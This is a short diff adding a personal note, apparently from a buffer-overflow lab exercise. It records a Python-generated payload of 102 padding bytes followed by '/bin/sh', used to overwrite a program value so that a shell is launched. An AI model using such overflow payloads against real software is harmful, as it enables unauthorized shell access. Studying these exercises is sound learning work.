@@ -1,0 +1,2 @@
+My input to change it to /bin/sh was
+   $(python -c 'print("A"*102 + "/bin/sh")')
